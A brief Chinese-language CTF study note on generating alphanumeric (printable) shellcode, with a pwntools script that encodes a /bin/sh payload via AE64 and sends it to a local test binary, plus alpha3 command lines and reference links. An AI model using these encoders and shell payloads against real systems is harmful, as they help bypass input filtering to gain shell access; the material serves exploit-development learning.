# Alphanumeric Shellcode(Printable Shellcode) 可见字符shellcode

该程序可输入的字符范围为：0x30~0x7a

可以使用工具生成对应架构的Alphanumeric Shellcode

+   AE64：生成x64 shellcode

    +   ```python
        #使用方法：
        from pwn import *
        from ae64 import AE64
        
        context.log_level = 'debug'
        context.arch = 'amd64'
        
        p = process('./example1')
        
        obj = AE64()
        sc = obj.encode(asm(shellcraft.sh()),'r13')#这里r13是基于call r13.可自行调整
        
        p.sendline(sc)
        
        p.interactive()
        ```

+   alpha3：生成各种类型的字符shellcode

    +   生成x64 ： python ./ALPHA3.py x64 ascii mixedcase rax --input="shellcode"
        +   rax基于call rax

    +   生成x86 ： 选项比较多
        +   x86 ascii uppercase (数字+大写字母)
        +   x86 ascii lowercase (数字+小写字母)
        +   x86 ascii mixedcase (数字+大小写字母)

    工具使用参考：https://www.freebuf.com/articles/system/232280.html

    https://www.anquanke.com/post/id/85871

    具体：https://nets.ec/Alphanumeric_shellcode

    https://web.archive.org/web/20110716082815/http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes

    https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes